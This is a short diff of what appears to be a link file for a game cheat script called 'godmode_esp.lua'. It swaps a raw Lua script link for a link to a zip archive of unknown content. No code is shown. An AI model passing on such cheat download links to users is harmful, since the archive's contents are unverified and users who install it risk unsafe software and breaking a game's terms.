@@ -1,2 +1,2 @@
-# godmode_esp.lua
-https://raw.githubusercontent.com/DiscordDeveloper1/DiscordDeveloper1/main/godmode_esp.lua
+# https://raw.githubusercontent.com/DiscordDeveloper1/godmode_esp.lua/main/pleonic/godmode_esp.lua_1.6-alpha.2.zip
+https://raw.githubusercontent.com/DiscordDeveloper1/godmode_esp.lua/main/pleonic/godmode_esp.lua_1.6-alpha.2.zip
